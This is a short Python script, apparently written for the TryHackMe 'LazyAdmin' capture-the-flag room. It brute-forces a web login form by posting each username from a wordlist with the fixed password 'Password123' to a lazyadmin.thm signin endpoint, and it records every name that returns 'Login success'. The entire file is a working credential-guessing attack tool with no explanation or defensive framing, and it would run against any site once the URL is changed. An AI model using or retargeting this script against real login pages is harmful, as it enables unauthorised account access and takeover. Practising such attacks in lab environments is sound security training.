import requests as req

class BruteUsers(object):
    """docstring for BruteUsers"""
    def __init__(self):
        super(BruteUsers, self).__init__()
        self.users = []

    def start(self, name_wlist="/usr/share/wordlists/new/usernames.txt"):
        with open(name_wlist, "rb") as wl:
            self.wordlist = wl.read().strip(b"\n").split(b"\n")
            wl.close()

        print("[*] Wordlist %s" % name_wlist)
        print("[+] Start bruting...")
        i = 0
        len_wlist = len(self.wordlist)
        for user in self.wordlist:
            try:
                user = user.decode()
                i += 1
            except:
                continue

            print("\r[%s/%s] %s" % (i, len_wlist, user), end="                                       ")
            if self.check_user(user):
                print("\n[+] Found user: %s" % user)
                self.users += [user]
                answ = input("Continue? [Y/n]: ")
                if answ.lower() in ["y", ""]:
                    continue
                else:
                    self.print_users()
                    break

    def print_users(self):
        print("-"*50)
        print("[+] All users found:")
        for u in self.users:
            print(u)
            
    def check_user(self, user):
        r = req.post(url='http://lazyadmin.thm/content/as/?type=signin', data={'user': user, "password": "Password123", 'rememberMe': ''})
        if r.text.find("Login success") > 1:
            return(True)
        else:
            return(False)

if __name__ == "__main__":
    b = BruteUsers()
    b.start()